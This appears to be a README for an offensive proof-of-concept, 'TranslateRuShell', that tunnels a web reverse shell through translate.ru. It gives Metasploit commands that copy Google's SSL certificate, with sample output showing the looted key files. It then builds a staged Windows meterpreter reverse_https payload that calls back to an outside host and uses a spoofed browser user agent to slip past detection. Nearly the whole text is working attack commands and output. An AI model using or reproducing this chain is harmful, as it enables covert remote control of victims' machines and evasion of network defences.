# TranslateRuShell (PoC)
Web reverse shell through translate.ru as proxy

## Generate Meterpreter Payload

### Get Cert

use auxiliary/gather/impersonate_ssl
set RHOST www.google.com
set Proxies http:host:port
run

[*] www.google.com:443 - Connecting to www.google.com:443
[*] www.google.com:443 - Copying certificate from www.google.com:443
/C=PortSwigger/O=PortSwigger/OU=PortSwigger CA/CN=www.google.com 
[*] www.google.com:443 - Beginning export of certificate files
[*] www.google.com:443 - Creating looted key/crt/pem files for www.google.com:443
[+] www.google.com:443 - key: /root/.msf4/loot/20181213121009_default_74.125.131.99_www.google.com_k_916621.key
[+] www.google.com:443 - crt: /root/.msf4/loot/20181213121009_default_74.125.131.99_www.google.com_c_554054.crt
[+] www.google.com:443 - pem: /root/.msf4/loot/20181213121009_default_74.125.131.99_www.google.com_p_521262.pem
[*] Auxiliary module execution completed

### Generate staged payload with cert check

use payload/windows/meterpreter/reverse_https
set LHOST video.cft-sd.xyz
set LPORT 443
set HttpUserAgent "Mozilla/5.0 (X11; Windows x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
set LURI /rest/api
set stagerverifysslcert true
set HANDLERSSLCERT /media/sf_Pentest/20181213120429_default_74.125.131.106_www.google.com_p_105411.pem
generate -t csharp
